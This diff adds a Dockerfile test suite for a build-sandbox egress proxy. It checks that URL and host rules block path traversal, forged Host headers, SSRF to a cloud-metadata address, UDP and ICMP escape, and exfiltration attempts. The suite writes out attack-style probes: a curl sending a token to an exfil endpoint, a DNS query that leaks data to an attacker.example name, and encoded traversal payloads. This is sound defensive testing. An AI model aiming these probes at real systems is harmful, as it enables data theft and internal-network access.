@@ -1,0 +1,251 @@
+# curl rather than busybox wget: this engine's assertions are about methods and
+# response bodies, and busybox wget can send neither a POST nor report a status.
+# The image ships curl already, because installing it would need a package
+# mirror in the allowlist and make every case depend on a public CDN.
+#
+# FROM is deliberately not governed by this engine (see docs/inspect-engine.md),
+# so this pull succeeds whatever the rules say.
+FROM alpine/curl@sha256:1a4d725751c5bd50297ee243db5d4df8ac5aabdf7030dd40dcec3bc3fdaa1cfa
+
+# The runc wrapper puts the proxy's CA in the system store, so no --insecure is
+# needed except where a rule deliberately passes TLS through undecrypted.
+SHELL ["/bin/sh", "-c"]
+
+# `s` prints the body, `c` the status. A test asserts on both: a 200 that
+# returned the wrong resource is a failure the status alone would hide.
+ENV S='curl -sS --max-time 10'
+ENV C='curl -sS -o /dev/null -w %{http_code} --max-time 10'
+
+# ---------------------------------------------------------------------------
+# Rules under test (set by the Makefile target):
+#   allowed_url_rules:
+#     GET https://allowed.example.com/public/**
+#     GET https://allowed.example.com:9443/public/**
+#     GET|POST https://api.example.com/v1/*
+#   allowed_https_rules: sub.wildcard.example.com:443 absent.example.com:443
+#   allowed_http_rules:  allowed.example.com:80
+#   allow_tls_rules:     tlspass.example.com:443
+# ---------------------------------------------------------------------------
+
+# [URL rule - path allowed]
+RUN echo "=== [URL rule - path allowed] ===" && \
+    OUT=$($S https://allowed.example.com/public/pkg.tgz) && \
+    echo "$OUT" && \
+    case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# [URL rule - path outside the rule]
+RUN echo "=== [URL rule - path not allowed] ===" && \
+    CODE=$($C https://allowed.example.com/private/secret) && \
+    echo "status=$CODE" && \
+    [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
+
+# [URL rule - method outside the rule]
+# The same URL that a GET may have. Only the method differs, which is what no
+# host-level engine can express.
+RUN echo "=== [URL rule - method not allowed] ===" && \
+    CODE=$($C -X POST https://allowed.example.com/public/pkg.tgz) && \
+    echo "status=$CODE" && \
+    [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
+
+# [URL rule - method allowed]
+RUN echo "=== [URL rule - method allowed] ===" && \
+    OUT=$($S -X POST https://api.example.com/v1/thing) && \
+    echo "$OUT" && \
+    case "$OUT" in API\ POST*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# [Traversal - normalised before the rules see it]
+# Without normalisation the proxy matches /public/ and the origin serves
+# /private/, so a 200 carrying PRIVATE is the failure to catch here.
+RUN echo "=== [Traversal] ===" && \
+    CODE=$($C https://allowed.example.com/public/../private/secret) && \
+    echo "status=$CODE" && \
+    [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
+
+# [Traversal - percent-encoded]
+# `.` is unreserved, so `%2e%2e` only becomes a dot-dot segment once decoded.
+# Decoding after stripping left it intact and this returned PRIVATE with a 200.
+# --path-as-is stops curl resolving the path itself, so the proxy is what is
+# under test.
+RUN echo "=== [Traversal, encoded] ===" && \
+    for P in "%2e%2e/private/secret" "%2e%2e%2fprivate/secret" \
+             "%2E%2E%2Fprivate/secret" "..%2fprivate/secret"; do \
+      CODE=$(curl -sS -o /dev/null -w %{http_code} --path-as-is --max-time 10 \
+             "https://allowed.example.com/public/$P") && \
+      echo "  $P -> $CODE" && \
+      [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1); \
+    done
+
+# [Traversal - backslash, which the URL standard treats as a separator]
+# Raw or encoded, a backslash can climb on an origin that honours it. curl with
+# --path-as-is sends it literally; a conforming client would send `/` instead.
+RUN echo "=== [Traversal, backslash] ===" && \
+    for P in "x/..%5c../private/secret" "x/%2e%2e%5cprivate/secret" \
+             "x/..\\../private/secret" "x/\\..\\../private/secret"; do \
+      CODE=$(curl -sS -o /dev/null -w %{http_code} --path-as-is --max-time 10 \
+             "https://allowed.example.com/public/$P") && \
+      echo "  $P -> $CODE" && \
+      [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1); \
+    done
+
+# [Traversal guard does not catch legitimate paths]
+# An encoded slash on its own is how npm asks for a scoped package, and a name
+# may simply contain dots.
+RUN echo "=== [Not traversal] ===" && \
+    for P in "@scope%2fpkg" "my..pkg" "pkg.tgz" "a%5cb"; do \
+      OUT=$(curl -sS --path-as-is --max-time 10 "https://allowed.example.com/public/$P") && \
+      echo "  $P -> $OUT" && \
+      case "$OUT" in PUBLIC*) : ;; *) echo "FAILED: refused a legitimate path" && exit 1 ;; esac; \
+    done
+
+# [Non-standard TLS port]
+# Nothing declares 9443 as TLS. Reaching the origin there proves both that the
+# listener classified it by content and that the original port survived to the
+# origin connection.
+RUN echo "=== [Non-standard TLS port 9443] ===" && \
+    OUT=$($S https://allowed.example.com:9443/public/pkg.tgz) && \
+    echo "$OUT" && \
+    case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# [Host rule - any path, any method]
+RUN echo "=== [Host rule] ===" && \
+    OUT=$($S -X DELETE https://sub.wildcard.example.com/anything/at/all) && \
+    echo "$OUT" && \
+    case "$OUT" in ROOT\ DELETE*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# [Plaintext host rule]
+RUN echo "=== [HTTP host rule] ===" && \
+    OUT=$($S http://allowed.example.com/public/pkg.tgz) && \
+    echo "$OUT" && \
+    case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# [Blocked host - the full URL is what gets recorded]
+# The query string carries the payload an exfiltration attempt would use, and
+# keeping it is the point: assert-inspect-restrict.sh looks for it verbatim.
+RUN echo "=== [Blocked host] ===" && \
+    CODE=$($C "https://blocked.example.com/exfil?token=SECRET-VALUE") && \
+    echo "status=$CODE" && \
+    [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
+
+# [Allowlisted name that does not resolve]
+# Reached by address so the client's own lookup cannot fail first: the build
+# resolves through the same resolver, so asking it for this name directly would
+# never get as far as the proxy. The proxy then resolves the Host header,
+# fails, and refuses rather than falling back to the address it was handed.
+RUN echo "=== [Name does not resolve] ===" && \
+    CODE=$($C --insecure -H 'Host: absent.example.com' https://10.200.0.101/) && \
+    echo "status=$CODE" && \
+    [ "$CODE" = "502" ] || (echo "FAILED: expected 502" && exit 1)
+
+# [Name outside the allowlist is not even looked up]
+# The resolver answers it locally, so the build cannot learn its real address;
+# the request lands on the proxy and is refused there with its URL recorded.
+RUN echo "=== [Name outside the allowlist] ===" && \
+    CODE=$($C https://notallowed.example.com/) && \
+    echo "status=$CODE" && \
+    [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
+
+# [Forged Host - the destination is not the client's to choose]
+# Aimed at the impostor by address while claiming an allowed name. The proxy
+# resolves the name itself, so the allowed origin answers and the impostor is
+# never reached.
+RUN echo "=== [Forged Host] ===" && \
+    OUT=$($S --insecure -H 'Host: allowed.example.com' https://10.200.0.101/public/pkg.tgz) && \
+    echo "$OUT" && \
+    case "$OUT" in \
+      PUBLIC\ GET*) echo "OK: reached the resolved origin" ;; \
+      IMPOSTOR*) echo "FAILED: reached the address the client chose" && exit 1 ;; \
+      *) echo "FAILED: unexpected body" && exit 1 ;; \
+    esac
+
+# [TLS passthrough]
+# Judged on SNI alone and never decrypted, so the build validates the origin's
+# own self-signed certificate: --insecure here is the assertion, not a
+# workaround. A decrypted connection would present the proxy's CA instead,
+# which the system store already trusts.
+RUN echo "=== [TLS passthrough] ===" && \
+    OUT=$($S --insecure https://tlspass.example.com/public/x) && \
+    echo "$OUT" && \
+    case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# [DNS-only exfiltration]
+# No connection is ever made, so the resolver's log is the only record. The
+# lookup is expected to fail; what matters is that it was refused and recorded.
+RUN echo "=== [DNS-only exfiltration] ===" && \
+    (nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true) && \
+    echo "queried"
+
+# [A rule may name an address, and it stays inspected]
+# No resolver can answer an address, so the proxy takes one in the Host header
+# as it stands rather than asking. Without that a rule naming an address could
+# never be satisfied, and the only way to reach one would be the uninspected
+# passthrough of allowed_ip_rules.
+RUN echo "=== [Address in a URL rule] ===" && \
+    OUT=$($S http://10.200.0.100/pub-by-addr/x) && \
+    echo "$OUT" && \
+    case "$OUT" in ROOT\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
+
+# The path rule still applies, which is the whole point of not passing it
+# through uninspected.
+RUN echo "=== [Address, path outside the rule] ===" && \
+    CODE=$($C http://10.200.0.100/private/secret) && \
+    echo "status=$CODE" && \
+    [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
+
+# Not an address, however much it looks like one. It falls through to the
+# resolver, which cannot answer it either.
+RUN echo "=== [Address-shaped but invalid] ===" && \
+    for H in 999.1.2.3 010.0.0.1 1.2.3.4.evil.example; do \
+      CODE=$($C --resolve "$H:80:10.200.0.100" "http://$H/pub-by-addr/x") && \
+      echo "  $H -> $CODE" && \
+      [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1); \
+    done
+
+# [SSRF - an allowlisted name resolving inward]
+# metadata.example.com is allowlisted but resolves to 169.254.169.254. The name
+# passes the rules; the resolved address must not. Without the guard the proxy
+# would fetch cloud metadata and hand it back.
+RUN echo "=== [SSRF via allowlisted name] ===" && \
+    CODE=$($C --insecure https://metadata.example.com/latest/meta-data) && \
+    echo "status=$CODE" && \
+    [ "$CODE" = "403" ] || (echo "FAILED: reached an internal address" && exit 1)
+
+# [Direct address, no ip rule]
+RUN echo "=== [Direct address] ===" && \
+    CODE=$($C http://10.200.0.101/) && \
+    echo "status=$CODE" && \
+    [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
+
+# [UDP is dropped]
+# The cage forwards nothing, so a build cannot leave over UDP: no QUIC, no
+# HTTP/3, no DNS to a resolver of its own choosing. assert-inspect-restrict.sh
+# runs the same probe from beside the echo server, where it must succeed, so a
+# silent fixture cannot pass for enforcement.
+RUN echo "=== [UDP] ===" && \
+    OUT=$(echo probe | nc -u -w 3 10.200.0.102 9999 2>/dev/null || true) && \
+    echo "reply=[$OUT]" && \
+    [ -z "$OUT" ] || (echo "FAILED: UDP left the cage" && exit 1)
+
+# [DNS is the one exception]
+# Port 53 is the only UDP the gateway accepts, and only to itself.
+RUN echo "=== [DNS still resolves] ===" && \
+    nslookup allowed.example.com >/dev/null 2>&1 && echo "OK"
+
+# [ICMP is dropped]
+RUN echo "=== [ICMP] ===" && \
+    (ping -c 1 -W 2 10.200.0.100 >/dev/null 2>&1 && echo "FAILED: ping left the cage" && exit 1) || echo "OK"
+
+# [Package manager - apk has no CA store of its own]
+# apk (like apt/yum) trusts whatever OpenSSL's system store trusts rather than
+# a store of its own. Reusing /public/** as a fake index only exercises the
+# TLS leg: a file-format error proves the handshake (and the rule) passed,
+# while "not trusted" is what an uninjected CA would say instead.
+RUN echo "=== [Package manager - apk over the injected CA] ===" && \
+    echo "https://allowed.example.com/public" > /etc/apk/repositories && \
+    OUT=$(apk update 2>&1); \
+    echo "$OUT" && \
+    case "$OUT" in \
+      *"not trusted"*) echo "FAILED: TLS was not trusted" && exit 1 ;; \
+      *) echo "OK: reached the origin over TLS" ;; \
+    esac
+
+RUN echo "=== End of test ==="
